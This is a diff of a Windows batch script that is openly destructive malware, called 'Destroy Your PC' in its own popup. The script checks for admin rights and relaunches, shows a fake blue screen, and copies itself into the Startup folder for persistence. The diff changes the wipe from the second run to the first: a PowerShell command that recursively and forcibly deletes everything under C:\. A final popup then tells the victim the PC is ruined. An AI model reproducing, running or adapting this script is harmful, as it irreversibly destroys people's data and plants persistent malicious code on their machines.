@@ -1,5 +1,6 @@
-@echo off
+@echo off 
 :: === ADMIN CHECK ===
+
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     echo [!] Admin rights required. Relaunching...
@@ -32,11 +33,6 @@ powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windo
 :: === FAKE BLUE SCREEN TRICK ===
 start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been detected... && pause >nul"
 
-:: === SAVE RUN CHECK ===
-if exist "%temp%\payload_ran_once.txt" goto :WIPE
-echo First run detected.
-echo ran > "%temp%\payload_ran_once.txt"
-
 :: === SELF-COPY TO STARTUP ===
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul
 
@@ -59,13 +55,12 @@ ping localhost -n 2 >nul
 echo Virus fully deployed.
 ping localhost -n 2 >nul
 
-:: === RESTART SYSTEM ===
-shutdown -r -t 10 -c "Restarting for full infection to complete..."
-exit
+:: === WIPE ===
+echo [!!] FIRST EXECUTION DETECTED - INITIATING DESTRUCTION...
+powershell -Command "Remove-Item -Path C:\* -Recurse -Force"
 
-:WIPE
-:: === SECOND RUN WIPE ===
-echo [!!] SECOND EXECUTION DETECTED - INITIATING DESTRUCTION...
-timeout /t 3
-powershell -Command "Start-Process powershell -Verb runAs -ArgumentList 'Remove-Item -Path C:\* -Recurse -Force'" 
-exit
+:: === FINAL POPUP ===
+powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', '💀 Warning 💀')"
+
+:: Script blijft nu open, geen exit of reboot
+pause
